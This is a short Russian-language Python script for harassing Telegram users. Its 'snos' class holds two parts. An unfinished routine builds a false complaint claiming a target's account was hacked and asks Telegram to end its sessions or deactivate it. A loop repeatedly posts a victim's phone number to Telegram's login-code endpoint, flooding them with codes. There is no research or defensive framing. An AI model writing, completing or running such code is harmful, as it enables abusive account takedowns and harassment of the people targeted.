import time
import smtplib
import requests
import os
sm = smtplib.SMTP("smtp.gmail.com", 587)

class snos:
    def session(numbers, id):
        complaint_text = f"Здравствуйте, мой аккаунт на номер: {numbers}, ID аккаунта: {id} взломали и при заходе на аккаунт мою сессию постоянно завершают, поэтому прошу вас обнулить все сессии или вовсе деактивируйте мой аккаунт"
        # # sm.login("sapdaspda@mail.ru", "23434343434")
        # sm.sendmail("sapdaspda@mail.ru", "m64tq0b39n@qejjyl.com", "asdasd")
        #функция не доделана
    def spam():
        phone = str(input("без +: "))
        quantity = int(input("введите количество попыток входа ")) + 1
        for i in range(1, quantity):
            print(f"попытка №{i} входа по номеру: {phone}")
            response = requests.post("https://my.telegram.org/auth/send_password", headers={'user_agent': "user"}, data = {"phone": phone})
            time.sleep(10)
       
            